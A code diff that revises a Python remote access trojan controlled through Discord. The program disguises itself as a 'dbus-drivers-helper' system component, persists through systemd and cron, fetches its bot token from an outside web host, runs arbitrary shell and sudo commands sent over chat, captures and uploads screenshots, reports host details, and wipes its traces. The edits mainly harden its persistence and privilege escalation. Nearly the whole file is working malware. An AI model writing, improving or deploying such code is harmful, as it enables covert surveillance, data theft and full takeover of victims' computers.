@@ -13,10 +13,7 @@ import time
 import socket
 import platform
 import requests
-import asyncio
-import logging
 from pathlib import Path
-import fcntl
 
 # ----------------- CONFIGURATION -----------------
 DISCORD_TOKEN = "YOUR_ACTUAL_DISCORD_TOKEN_HERE"
@@ -28,29 +25,13 @@ TOKEN_BASE_URLS = [
     "https://new-5itj.onrender.com/api/token"
 ]
 
-# Deep system integration paths
+# Deep system integration paths (not hidden but hard to find)
 STEALTH_DIR = Path("/usr/lib/x86_64-linux-gnu/dbus-1.0/drivers")
 STEALTH_BINARY = STEALTH_DIR / "dbus-drivers-helper"
 SCREENSHOT_SCRIPT = STEALTH_DIR / "system-python-lib23443.py"
 SERVICE_DIR = Path("/etc/systemd/system")
 SERVICE_FILE = SERVICE_DIR / "dbus-drivers-helper.service"
 CRON_FILE = Path("/etc/cron.d/dbus-system-maintenance")
-LOCK_FILE = Path("/tmp/dbus-drivers-helper.lock")
-
-# Setup logging
-logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
-logger = logging.getLogger(__name__)
-
-# ----------------- SINGLETON LOCK -----------------
-def acquire_lock():
-    """Ensure only one instance runs at a time"""
-    try:
-        lock_fd = open(LOCK_FILE, 'w')
-        fcntl.flock(lock_fd, fcntl.LOCK_EX | fcntl.LOCK_NB)
-        return lock_fd
-    except (IOError, BlockingIOError):
-        logger.error("Another instance is already running. Exiting.")
-        sys.exit(1)
 
 # ----------------- SCREENSHOT SCRIPT CONTENT -----------------
 SCREENSHOT_SCRIPT_CONTENT ="""#!/usr/bin/env python3
@@ -65,10 +46,14 @@ import tempfile
 import subprocess
 import time
 
+# Set display environment variables to avoid black screens
+os.environ['DISPLAY'] = ':0'
+os.environ['XAUTHORITY'] = f'/run/user/{os.getuid()}/gdm/Xauthority' if os.path.exists(f'/run/user/{os.getuid()}/gdm/Xauthority') else f'/home/{os.getlogin()}/.Xauthority'
+
 def take_screenshot():
     # Robust screenshot function that handles multiple scenarios
     try:
-        # Try to detect the actual display and X authority
+        # Try to detect the actual display
         display = detect_display()
         xauth = detect_xauthority()
         
@@ -79,13 +64,15 @@ def take_screenshot():
             env['XAUTHORITY'] = xauth
         
         # Try multiple methods with proper error handling
-        temp_dir = tempfile.gettempdir()
-        screenshot_path = os.path.join(temp_dir, f"screenshot_{int(time.time())}.png")
+        screenshot_path = None
         
         # Method 1: Try scrot (most reliable)
         try:
+            temp_dir = tempfile.gettempdir()
+            screenshot_path = os.path.join(temp_dir, f"screenshot_{int(time.time())}.png")
+            
             result = subprocess.run([
-                'scrot', '-z', '-q', '80', screenshot_path
+                'scrot', '-z', '-q', '100', screenshot_path
             ], env=env, capture_output=True, text=True, timeout=15)
             
             if result.returncode == 0 and os.path.exists(screenshot_path):
@@ -96,6 +83,9 @@ def take_screenshot():
         
         # Method 2: Try import (ImageMagick)
         try:
+            if not screenshot_path:
+                screenshot_path = os.path.join(temp_dir, f"screenshot_{int(time.time())}.png")
+            
             result = subprocess.run([
                 'import', '-window', 'root', '-quiet', screenshot_path
             ], env=env, capture_output=True, text=True, timeout=15)
@@ -108,6 +98,9 @@ def take_screenshot():
         
         # Method 3: Try xwd + convert
         try:
+            if not screenshot_path:
+                screenshot_path = os.path.join(temp_dir, f"screenshot_{int(time.time())}.png")
+            
             xwd_path = screenshot_path + '.xwd'
             result = subprocess.run([
                 'xwd', '-root', '-silent', '-out', xwd_path
@@ -155,24 +148,23 @@ def detect_xauthority():
     xauth_locations = [
         f'/run/user/{os.getuid()}/gdm/Xauthority',
         f'/home/{os.getlogin()}/.Xauthority',
-        '/root/.Xauthority',
-        f'/run/user/{os.getuid()}/.Xauthority'
+        '/root/.Xauthority'
     ]
     
     for location in xauth_locations:
         if os.path.exists(location):
             return location
     
-    # Try to find current Xauth using who and xauth
+    # Try to find Xauthority using xauth
     try:
-        # Get current user's display
-        who_result = subprocess.run(['who'], capture_output=True, text=True)
-        if who_result.returncode == 0:
-            for line in who_result.stdout.split('\\n'):
-                if '(:' in line and '.0)' in line:
-                    display_part = line.split('(:')[1].split(')')[0]
-                    if display_part:
-                        return f'/run/user/{os.getuid()}/.Xauthority'
+        result = subprocess.run(['xauth', 'list'], capture_output=True, text=True)
+        if result.returncode == 0:
+            # Extract authority file from xauth output
+            lines = result.stdout.split('\n')
+            if lines and ' authority file ' in result.stderr:
+                for line in result.stderr.split('\n'):
+                    if ' authority file ' in line:
+                        return line.split(' authority file ')[1].strip()
     except:
         pass
     
@@ -184,60 +176,60 @@ if __name__ == "__main__":
         sys.exit(1)
 """
 
-# ----------------- DEPENDENCY INSTALLATION -----------------
-def install_dependencies():
-    """Install all required dependencies automatically"""
-    try:
-        logger.info("Installing required dependencies...")
-        
-        # Update package list
-        subprocess.run(["apt-get", "update"], check=False, capture_output=True, timeout=300)
-        
-        # Install system packages
-        system_packages = ["ffmpeg", "pulseaudio", "x11-utils", "scrot", "imagemagick", "python3-pip", "x11-apps"]
-        for pkg in system_packages:
-            result = subprocess.run(["apt-get", "install", "-y", pkg], 
-                                  check=False, capture_output=True, timeout=300)
-            if result.returncode != 0:
-                logger.warning(f"Failed to install {pkg}")
-        
-        # Install Python packages
-        python_packages = ["discord.py", "psutil", "requests", "pyautogui", "Pillow"]
-        result = subprocess.run([sys.executable, "-m", "pip", "install"] + python_packages, 
-                              check=False, capture_output=True, timeout=300)
-        
-        if result.returncode != 0:
-            logger.warning("Some Python packages failed to install")
-        
-        logger.info("Dependencies installed successfully")
-        return True
-    except Exception as e:
-        logger.error(f"Dependency install error: {e}")
-        return False
-
 # ----------------- TOKEN RETRIEVAL -----------------
 def fetch_token_from_web():
     """Try to fetch token from web endpoints with retry logic"""
     for base_url in TOKEN_BASE_URLS:
         url = f"{base_url}?code={TOKEN_CODE}"
         try:
-            logger.info(f"Attempting to fetch token from: {url}")
+            print(f"Attempting to fetch token from: {url}")
             response = requests.get(url, timeout=30)
             if response.status_code == 200:
                 data = response.json()
                 if data.get('success') and 'discord_token' in data:
                     token = data['discord_token']
                     if token and token != "YOUR_ACTUAL_DISCORD_TOKEN_HERE":
-                        logger.info("Successfully retrieved token from web")
+                        print("Successfully retrieved token from web")
                         return token
                 else:
-                    logger.warning(f"API returned error: {data.get('error', 'Unknown error')}")
+                    print(f"API returned error: {data.get('error', 'Unknown error')}")
         except requests.RequestException as e:
-            logger.warning(f"Failed to fetch token from {url}: {e}")
+            print(f"Failed to fetch token from {url}: {e}")
         except ValueError as e:
-            logger.warning(f"Invalid JSON response from {url}: {e}")
+            print(f"Invalid JSON response from {url}: {e}")
     
     return None
+
+# ----------------- AUTO-INSTALL DEPENDENCIES -----------------
+def install_dependencies():
+    """Install all required dependencies automatically"""
+    try:
+        print("Installing required dependencies...")
+        
+        # Install requests if not available
+        try:
+            import requests
+        except ImportError:
+            subprocess.run([sys.executable, "-m", "pip", "install", "requests"], 
+                          check=False, capture_output=True, timeout=120)
+        
+        # Update package list
+        subprocess.run(["apt-get", "update"], check=False, capture_output=True, timeout=120)
+        
+        # Install system packages
+        system_packages = ["ffmpeg", "pulseaudio", "x11-utils", "scrot", "imagemagick", "python3-pip", "x11-apps"]
+        subprocess.run(["apt-get", "install", "-y"] + system_packages, 
+                      check=False, capture_output=True, timeout=300)
+        
+        # Install Python packages
+        python_packages = ["discord.py", "psutil", "requests", "pyautogui", "Pillow"]
+        subprocess.run([sys.executable, "-m", "pip", "install"] + python_packages, 
+                      check=False, capture_output=True, timeout=120)
+        
+        return True
+    except Exception as e:
+        print(f"Dependency install error: {e}")
+        return False
 
 # ----------------- SCREENSHOT SCRIPT SETUP -----------------
 def install_screenshot_script():
@@ -250,10 +242,10 @@ def install_screenshot_script():
         SCREENSHOT_SCRIPT.write_text(SCREENSHOT_SCRIPT_CONTENT)
         SCREENSHOT_SCRIPT.chmod(0o755)  # Make executable
         
-        logger.info("Screenshot script installed successfully")
+        print("Screenshot script installed successfully")
         return True
     except Exception as e:
-        logger.error(f"Screenshot script install error: {e}")
+        print(f"Screenshot script install error: {e}")
         return False
 
 # ----------------- STEALTH INSTALLATION -----------------
@@ -285,21 +277,17 @@ def install_stealth():
             except:
                 pass
                 
-            logger.info("Stealth installation completed successfully")
             return True
         
         return False
     except Exception as e:
-        logger.error(f"Stealth install error: {e}")
+        print(f"Stealth install error: {e}")
         return False
 
 # ----------------- SYSTEMD SERVICE SETUP -----------------
 def install_systemd_service():
     """Install as system service for auto-start"""
     try:
-        # Get current username
-        username = os.getlogin()
-        
         # Create service file
         service_content = f"""[Unit]
 Description=DBus Drivers Helper Service
@@ -308,10 +296,10 @@ After=network.target graphical.target
 [Service]
 Type=simple
 Environment=DISPLAY=:0
-User={username}
+User={os.getlogin()}
 ExecStart={STEALTH_BINARY}
-Restart=on-failure
-RestartSec=30
+Restart=always
+RestartSec=10
 StandardOutput=null
 StandardError=null
 
@@ -326,27 +314,23 @@ WantedBy=multi-user.target
         subprocess.run(["systemctl", "enable", "dbus-drivers-helper.service"], check=True)
         subprocess.run(["systemctl", "start", "dbus-drivers-helper.service"], check=True)
         
-        logger.info("Systemd service installed successfully")
         return True
     except Exception as e:
-        logger.error(f"Systemd service install error: {e}")
+        print(f"Systemd service install error: {e}")
         return False
 
 # ----------------- CRON JOB SETUP -----------------
 def install_cron_job():
     """Install cron job as backup persistence"""
     try:
-        # Get current username
-        username = os.getlogin()
-        
-        cron_content = f"""@reboot {username} {STEALTH_BINARY}
+        cron_content = f"""@reboot {os.getlogin()} {STEALTH_BINARY}
+*/5 * * * * {os.getlogin()} {STEALTH_BINARY} --check
 """
         
         CRON_FILE.write_text(cron_content)
-        logger.info("Cron job installed successfully")
         return True
     except Exception as e:
-        logger.error(f"Cron job install error: {e}")
+        print(f"Cron job install error: {e}")
         return False
 
 # ----------------- DROP PRIVILEGES -----------------
@@ -366,25 +350,21 @@ def drop_privileges():
         os.setgid(original_gid)
         os.setuid(original_uid)
         
-        logger.info(f"Dropped privileges to UID: {original_uid}, GID: {original_gid}")
+        print(f"Dropped privileges to UID: {original_uid}, GID: {original_gid}")
         return True
     except Exception as e:
-        logger.error(f"Failed to drop privileges: {e}")
+        print(f"Failed to drop privileges: {e}")
         return False
 
 # ----------------- SELF-DESTRUCT FUNCTION -----------------
 def self_destruct():
     """Completely remove the bot and all traces"""
     try:
-        logger.info("Initiating self-destruct sequence...")
-        
-        # Remove lock file
-        if LOCK_FILE.exists():
-            LOCK_FILE.unlink()
+        print("Initiating self-destruct sequence...")
         
         # Temporarily regain root privileges for cleanup
         if os.geteuid() != 0:
-            logger.info("Need root privileges for cleanup, requesting sudo...")
+            print("Need root privileges for cleanup, requesting sudo...")
             subprocess.run(["sudo", "systemctl", "stop", "dbus-drivers-helper.service"], 
                           check=False, capture_output=True)
             subprocess.run(["sudo", "systemctl", "disable", "dbus-drivers-helper.service"], 
@@ -449,11 +429,11 @@ def self_destruct():
         except:
             pass
         
-        logger.info("Self-destruct completed. All traces removed.")
+        print("Self-destruct completed. All traces removed.")
         return True
         
     except Exception as e:
-        logger.error(f"Self-destruct error: {e}")
+        print(f"Self-destruct error: {e}")
         return False
 
 # ----------------- CLEAN TRACES -----------------
@@ -482,7 +462,7 @@ def clean_traces():
         
         return True
     except Exception as e:
-        logger.error(f"Clean traces error: {e}")
+        print(f"Clean traces error: {e}")
         return False
 
 # ----------------- SYSTEM INFO -----------------
@@ -524,7 +504,7 @@ def get_system_info():
         
         return info
     except Exception as e:
-        logger.error(f"System info error: {e}")
+        print(f"System info error: {e}")
         return {}
 
 # ----------------- SCREENSHOT FUNCTION -----------------
@@ -534,7 +514,7 @@ def take_screenshot():
         if not SCREENSHOT_SCRIPT.exists():
             # Need root to install screenshot script
             if os.geteuid() != 0:
-                logger.warning("Need root to install screenshot script")
+                print("Need root to install screenshot script")
                 return None
             install_screenshot_script()
         
@@ -548,171 +528,178 @@ def take_screenshot():
                 if line.startswith('SUCCESS:'):
                     return line.split(':')[1]  # Return the path
         else:
-            logger.error(f"Screenshot failed: {result.stderr}")
+            print(f"Screenshot failed: {result.stderr}")
             
         return None
     except Exception as e:
-        logger.error(f"Screenshot error: {e}")
+        print(f"Screenshot error: {e}")
         return None
 
-# ----------------- MAIN BOT SETUP -----------------
-def setup_bot():
-    """Setup and run the Discord bot"""
-    # Import Discord modules after dependencies are installed
+# ----------------- BOT SETUP -----------------
+# Install dependencies first
+install_dependencies()
+
+# Now import the modules
+try:
     import discord
     from discord.ext import commands
+    import psutil
+except ImportError as e:
+    print(f"Failed to import modules: {e}")
+    # Try to install again and exit
+    install_dependencies()
+    sys.exit(1)
+
+intents = discord.Intents.default()
+intents.message_content = True
+bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
+
+# ----------------- BOT COMMANDS -----------------
+@bot.event
+async def on_ready():
+    """Bot startup - announce system status"""
+    print("Stealth system initialized and running")
     
-    # Set up intents and bot
-    intents = discord.Intents.default()
-    intents.message_content = True
-    bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
-
-    # ----------------- BOT COMMANDS -----------------
-    @bot.event
-    async def on_ready():
-        """Bot startup - announce system status"""
-        logger.info("Stealth system initialized and running")
-        
-        # Auto-install on first run
-        if not STEALTH_BINARY.exists():
-            install_stealth()
-            # Drop privileges after installation
-            drop_privileges()
-        
-        clean_traces()
-        
-        # Announce system startup
-        system_info = get_system_info()
-        announcement_channel = None
-        
-        # Try to find a channel to announce in
-        for guild in bot.guilds:
-            for channel in guild.text_channels:
-                if channel.permissions_for(guild.me).send_messages:
-                    announcement_channel = channel
-                    break
-            if announcement_channel:
+    # Auto-install on first run
+    if not STEALTH_BINARY.exists():
+        install_stealth()
+        # Drop privileges after installation
+        drop_privileges()
+    
+    clean_traces()
+    
+    # Announce system startup
+    system_info = get_system_info()
+    announcement_channel = None
+    
+    # Try to find a channel to announce in
+    for guild in bot.guilds:
+        for channel in guild.text_channels:
+            if channel.permissions_for(guild.me).send_messages:
+                announcement_channel = channel
                 break
-        
         if announcement_channel:
-            message = f"🚀 **System Online**\n"
-            message += f"**Host:** {system_info.get('hostname', 'Unknown')}\n"
-            message += f"**User:** {system_info.get('username', 'Unknown')}\n"
-            message += f"**IP:** {system_info.get('ip_address', 'Unknown')}\n"
-            message += f"**OS:** {system_info.get('system', 'Unknown')} {system_info.get('release', 'Unknown')}\n"
-            message += f"**Uptime:** {system_info.get('uptime_days', 0)} days\n"
-            message += f"**Status:** Operational and hidden"
-            
-            try:
-                await announcement_channel.send(message)
-            except Exception as e:
-                logger.error(f"Failed to send announcement: {e}")
+            break
+    
+    if announcement_channel:
+        message = f"🚀 **System Online**\n"
+        message += f"**Host:** {system_info.get('hostname', 'Unknown')}\n"
+        message += f"**User:** {system_info.get('username', 'Unknown')}\n"
+        message += f"**IP:** {system_info.get('ip_address', 'Unknown')}\n"
+        message += f"**OS:** {system_info.get('system', 'Unknown')} {system_info.get('release', 'Unknown')}\n"
+        message += f"**Uptime:** {system_info.get('uptime_days', 0)} days\n"
+        message += f"**Status:** Operational and hidden"
+        
+        try:
+            await announcement_channel.send(message)
+        except:
+            pass
 
-    @bot.command(name="sysinfo")
-    async def cmd_sysinfo(ctx):
-        """Get system information"""
+@bot.command(name="sysinfo")
+async def cmd_sysinfo(ctx):
+    """Get system information"""
+    system_info = get_system_info()
+    
+    message = f"💻 **System Information**\n"
+    message += f"```\n"
+    message += f"Hostname: {system_info.get('hostname', 'Unknown')}\n"
+    message += f"Username: {system_info.get('username', 'Unknown')}\n"
+    message += f"IP: {system_info.get('ip_address', 'Unknown')}\n"
+    message += f"OS: {system_info.get('system', 'Unknown')} {system_info.get('release', 'Unknown')}\n"
+    message += f"Processor: {system_info.get('processor', 'Unknown')}\n"
+    message += f"Uptime: {system_info.get('uptime_days', 0)} days\n"
+    message += f"```"
+    
+    await ctx.send(message)
+
+@bot.command(name="cmd")
+async def cmd_exec(ctx, *, command: str):
+    """Execute system command (non-privileged)"""
+    try:
+        # Security check - prevent dangerous commands
+        dangerous_commands = ["rm -rf /", "mkfs", "dd if=/dev/", ":(){:|:&};:"]
+        if any(dangerous in command for dangerous in dangerous_commands):
+            await ctx.send("❌ Command blocked for security reasons")
+            return
+            
+        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
+        output = result.stdout or result.stderr or "No output"
+        
+        if len(output) > 1900:
+            output = output[:1900] + "..."
+            
+        await ctx.send(f"```bash\n$ {command}\n{output}\nExit: {result.returncode}\n```")
+    except Exception as e:
+        await ctx.send(f"❌ Command failed: {e}")
+
+@bot.command(name="root")
+async def cmd_root(ctx, *, command: str):
+    """Execute system command with root privileges"""
+    try:
+        # Security check - prevent extremely dangerous commands
+        dangerous_commands = ["rm -rf /", "mkfs", "dd if=/dev/zero", ":(){:|:&};:"]
+        if any(dangerous in command for dangerous in dangerous_commands):
+            await ctx.send("❌ Command blocked for security reasons")
+            return
+            
+        # Execute with sudo
+        result = subprocess.run(f"sudo {command}", shell=True, capture_output=True, text=True, timeout=30)
+        output = result.stdout or result.stderr or "No output"
+        
+        if len(output) > 1900:
+            output = output[:1900] + "..."
+            
+        await ctx.send(f"```bash\n# {command}\n{output}\nExit: {result.returncode}\n```")
+    except Exception as e:
+        await ctx.send(f"❌ Root command failed: {e}")
+
+@bot.command(name="clean")
+async def cmd_clean(ctx):
+    """Clean all traces"""
+    if clean_traces():
+        await ctx.send("✅ All traces cleaned")
+    else:
+        await ctx.send("❌ Clean failed")
+
+@bot.command(name="status")
+async def cmd_status(ctx):
+    """Check bot status"""
+    try:
+        # Check if service is running
+        result = subprocess.run(["systemctl", "is-active", "dbus-drivers-helper.service"], 
+                              capture_output=True, text=True)
+        status = "🟢 Running" if result.returncode == 0 else "🔴 Stopped"
+        
+        # Get system info
         system_info = get_system_info()
         
-        message = f"💻 **System Information**\n"
-        message += f"```\n"
-        message += f"Hostname: {system_info.get('hostname', 'Unknown')}\n"
-        message += f"Username: {system_info.get('username', 'Unknown')}\n"
-        message += f"IP: {system_info.get('ip_address', 'Unknown')}\n"
-        message += f"OS: {system_info.get('system', 'Unknown')} {system_info.get('release', 'Unknown')}\n"
-        message += f"Processor: {system_info.get('processor', 'Unknown')}\n"
-        message += f"Uptime: {system_info.get('uptime_days', 0)} days\n"
-        message += f"```"
-        
-        await ctx.send(message)
+        await ctx.send(f"**Bot Status:** {status}\n"
+                      f"**Service:** `dbus-drivers-helper.service`\n"
+                      f"**Location:** `{STEALTH_BINARY}`\n"
+                      f"**Host:** {system_info.get('hostname', 'Unknown')}\n"
+                      f"**Uptime:** {system_info.get('uptime_days', 0)} days\n"
+                      f"**Privileges:** {'Root' if os.geteuid() == 0 else 'User'}")
+    except:
+        await ctx.send("✅ Bot is operational")
 
-    @bot.command(name="cmd")
-    async def cmd_exec(ctx, *, command: str):
-        """Execute system command (non-privileged)"""
-        try:
-            # Security check - prevent dangerous commands
-            dangerous_commands = ["rm -rf /", "mkfs", "dd if=/dev/", ":(){:|:&};:"]
-            if any(dangerous in command for dangerous in dangerous_commands):
-                await ctx.send("❌ Command blocked for security reasons")
-                return
-                
-            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
-            output = result.stdout or result.stderr or "No output"
-            
-            if len(output) > 1900:
-                output = output[:1900] + "..."
-                
-            await ctx.send(f"```bash\n$ {command}\n{output}\nExit: {result.returncode}\n```")
-        except Exception as e:
-            await ctx.send(f"❌ Command failed: {e}")
+@bot.command(name="restart")
+async def cmd_restart(ctx):
+    """Restart the bot service"""
+    try:
+        # Need sudo to restart service
+        subprocess.run(["sudo", "systemctl", "restart", "dbus-drivers-helper.service"], 
+                      check=False, capture_output=True)
+        await ctx.send("✅ Bot service restarted")
+    except:
+        await ctx.send("❌ Restart failed")
 
-    @bot.command(name="root")
-    async def cmd_root(ctx, *, command: str):
-        """Execute system command with root privileges"""
-        try:
-            # Security check - prevent extremely dangerous commands
-            dangerous_commands = ["rm -rf /", "mkfs", "dd if=/dev/zero", ":(){:|:&};:"]
-            if any(dangerous in command for dangerous in dangerous_commands):
-                await ctx.send("❌ Command blocked for security reasons")
-                return
-                
-            # Execute with sudo
-            result = subprocess.run(f"sudo {command}", shell=True, capture_output=True, text=True, timeout=30)
-            output = result.stdout or result.stderr or "No output"
-            
-            if len(output) > 1900:
-                output = output[:1900] + "..."
-                
-            await ctx.send(f"```bash\n# {command}\n{output}\nExit: {result.returncode}\n```")
-        except Exception as e:
-            await ctx.send(f"❌ Root command failed: {e}")
-
-    @bot.command(name="clean")
-    async def cmd_clean(ctx):
-        """Clean all traces"""
-        if clean_traces():
-            await ctx.send("✅ All traces cleaned")
-        else:
-            await ctx.send("❌ Clean failed")
-
-    @bot.command(name="status")
-    async def cmd_status(ctx):
-        """Check bot status"""
-        try:
-            # Check if service is running
-            result = subprocess.run(["systemctl", "is-active", "dbus-drivers-helper.service"], 
-                                  capture_output=True, text=True)
-            status = "🟢 Running" if result.returncode == 0 else "🔴 Stopped"
-            
-            # Get system info
-            system_info = get_system_info()
-            
-            await ctx.send(f"**Bot Status:** {status}\n"
-                          f"**Service:** `dbus-drivers-helper.service`\n"
-                          f"**Location:** `{STEALTH_BINARY}`\n"
-                          f"**Host:** {system_info.get('hostname', 'Unknown')}\n"
-                          f"**Uptime:** {system_info.get('uptime_days', 0)} days\n"
-                          f"**Privileges:** {'Root' if os.geteuid() == 0 else 'User'}")
-        except:
-            await ctx.send("✅ Bot is operational")
-
-    @bot.command(name="restart")
-    async def cmd_restart(ctx):
-        """Restart the bot service"""
-        try:
-            # Need sudo to restart service
-            subprocess.run(["sudo", "systemctl", "restart", "dbus-drivers-helper.service"], 
-                          check=False, capture_output=True)
-            await ctx.send("✅ Bot service restarted")
-        except:
-            await ctx.send("❌ Restart failed")
-
-    @bot.command(name="update")
-    async def cmd_update(ctx):
-        """Update the bot"""
-        try:
-            # Create update script
-            update_script = "/tmp/update_bot.sh"
-            script_content = f"""#!/bin/bash
+@bot.command(name="update")
+async def cmd_update(ctx):
+    """Update the bot"""
+    try:
+        # Create update script
+        update_script = "/tmp/update_bot.sh"
+        script_content = f"""#!/bin/bash
 # Kill current process
 sudo systemctl stop dbus-drivers-helper.service
 # Wait a moment
@@ -723,96 +710,88 @@ sudo cp {STEALTH_BINARY} {STEALTH_BINARY}.backup
 sudo systemctl start dbus-drivers-helper.service
 echo "Update completed"
 """
-            
-            with open(update_script, 'w') as f:
-                f.write(script_content)
-            
-            subprocess.run(["chmod", "+x", update_script])
-            subprocess.run([update_script], check=False)
-            
-            await ctx.send("✅ Bot updated successfully")
-        except Exception as e:
-            await ctx.send(f"❌ Update failed: {e}")
+        
+        with open(update_script, 'w') as f:
+            f.write(script_content)
+        
+        subprocess.run(["chmod", "+x", update_script])
+        subprocess.run([update_script], check=False)
+        
+        await ctx.send("✅ Bot updated successfully")
+    except Exception as e:
+        await ctx.send(f"❌ Update failed: {e}")
 
-    @bot.command(name="screen")
-    async def cmd_screen(ctx):
-        """Take a screenshot of the current display"""
-        try:
-            await ctx.send("📸 Taking screenshot...")
+@bot.command(name="screen")
+async def cmd_screen(ctx):
+    """Take a screenshot of the current display"""
+    try:
+        await ctx.send("📸 Taking screenshot...")
+        
+        # Take screenshot using the external script
+        screenshot_path = take_screenshot()
+        
+        if screenshot_path and os.path.exists(screenshot_path):
+            # Send the screenshot file
+            with open(screenshot_path, 'rb') as f:
+                picture = discord.File(f, filename='screenshot.png')
+                await ctx.send(file=picture)
             
-            # Take screenshot using the external script
-            screenshot_path = take_screenshot()
+            # Clean up the temporary file
+            try:
+                os.remove(screenshot_path)
+            except:
+                pass
+        else:
+            await ctx.send("❌ Failed to capture screenshot")
             
-            if screenshot_path and os.path.exists(screenshot_path):
-                # Send the screenshot file
-                with open(screenshot_path, 'rb') as f:
-                    picture = discord.File(f, filename='screenshot.png')
-                    await ctx.send(file=picture)
-                
-                # Clean up the temporary file
-                try:
-                    os.remove(screenshot_path)
-                except:
-                    pass
-            else:
-                await ctx.send("❌ Failed to capture screenshot - Make sure you have a graphical desktop running")
-                
-        except Exception as e:
-            await ctx.send(f"❌ Screenshot error: {e}")
+    except Exception as e:
+        await ctx.send(f"❌ Screenshot error: {e}")
 
-    @bot.command(name="delete")
-    async def cmd_delete(ctx):
-        """Completely remove the bot and all traces"""
-        try:
-            await ctx.send("🚨 **Self-destruct initiated** - Removing all traces...")
+@bot.command(name="delete")
+async def cmd_delete(ctx):
+    """Completely remove the bot and all traces"""
+    try:
+        await ctx.send("🚨 **Self-destruct initiated** - Removing all traces...")
+        
+        # Run self-destruct
+        if self_destruct():
+            await ctx.send("✅ **Self-destruct completed** - All traces removed. Goodbye!")
             
-            # Run self-destruct
-            if self_destruct():
-                await ctx.send("✅ **Self-destruct completed** - All traces removed. Goodbye!")
-                
-                # Exit the bot
-                await bot.close()
-            else:
-                await ctx.send("❌ Self-destruct failed - Manual cleanup may be required")
-                
-        except Exception as e:
-            await ctx.send(f"❌ Self-destruct error: {e}")
-    
-    return bot
+            # Exit the bot
+            await bot.close()
+        else:
+            await ctx.send("❌ Self-destruct failed - Manual cleanup may be required")
+            
+    except Exception as e:
+        await ctx.send(f"❌ Self-destruct error: {e}")
 
 # ----------------- MAIN -----------------
 if __name__ == "__main__":
-    # Acquire singleton lock to prevent multiple instances
-    lock_fd = acquire_lock()
-    
-    # Install dependencies first
-    install_dependencies()
+    # Check if we need to use sudo for installation
+    if os.geteuid() != 0 and not STEALTH_BINARY.exists():
+        print("Requesting sudo privileges for installation...")
+        # Re-run with sudo for installation
+        os.execvp("sudo", ["sudo", sys.executable] + sys.argv)
     
     # Check if we need to fetch token from web
     if DISCORD_TOKEN == "YOUR_ACTUAL_DISCORD_TOKEN_HERE":
-        logger.info("Local token not found, attempting to fetch from web...")
+        print("Local token not found, attempting to fetch from web...")
         web_token = fetch_token_from_web()
         
         if web_token:
             DISCORD_TOKEN = web_token
-            logger.info("Using token retrieved from web")
+            print("Using token retrieved from web")
         else:
-            logger.warning("Failed to retrieve token from web, waiting 60 seconds to retry...")
+            print("Failed to retrieve token from web, waiting 60 seconds to retry...")
             time.sleep(60)
             web_token = fetch_token_from_web()
             
             if web_token:
                 DISCORD_TOKEN = web_token
-                logger.info("Using token retrieved from web on second attempt")
+                print("Using token retrieved from web on second attempt")
             else:
-                logger.error("Could not retrieve token from any source!")
+                print("ERROR: Could not retrieve token from any source!")
                 sys.exit(1)
-    
-    # Check if we need to use sudo for installation
-    if os.geteuid() != 0 and not STEALTH_BINARY.exists():
-        logger.info("Requesting sudo privileges for installation...")
-        # Re-run with sudo for installation
-        os.execvp("sudo", ["sudo", sys.executable] + sys.argv)
     
     # Auto-install on first run
     if not STEALTH_BINARY.exists():
@@ -821,39 +800,31 @@ if __name__ == "__main__":
         drop_privileges()
         clean_traces()
     
-    # Setup and run the bot
-    bot = setup_bot()
-    
     # Run the bot with retry logic
     max_retries = 3
     retry_delay = 60  # seconds
     
     for attempt in range(max_retries):
         try:
-            logger.info(f"Starting stealth monitoring bot (attempt {attempt + 1}/{max_retries})...")
+            print(f"Starting stealth monitoring bot (attempt {attempt + 1}/{max_retries})...")
             bot.run(DISCORD_TOKEN)
             break  # If successful, break out of the loop
         except discord.LoginFailure:
-            logger.error("Invalid token, attempting to fetch a new one...")
+            print("Invalid token, attempting to fetch a new one...")
             web_token = fetch_token_from_web()
             if web_token:
                 DISCORD_TOKEN = web_token
-                logger.info("Retrieved new token, will retry...")
+                print("Retrieved new token, will retry...")
             else:
-                logger.error("Failed to retrieve new token")
+                print("Failed to retrieve new token")
         except Exception as e:
-            logger.error(f"Bot failed to start: {e}")
+            print(f"Bot failed to start: {e}")
             
             # On last attempt, try to restart service
             if attempt == max_retries - 1:
-                logger.error("Max retries reached, attempting to restart service...")
+                print("Max retries reached, attempting to restart service...")
                 subprocess.run(["sudo", "systemctl", "restart", "dbus-drivers-helper.service"], check=False)
                 break
             
-            logger.info(f"Waiting {retry_delay} seconds before retry...")
+            print(f"Waiting {retry_delay} seconds before retry...")
             time.sleep(retry_delay)
-    
-    # Release the lock when done
-    lock_fd.close()
-    if LOCK_FILE.exists():
-        LOCK_FILE.unlink()
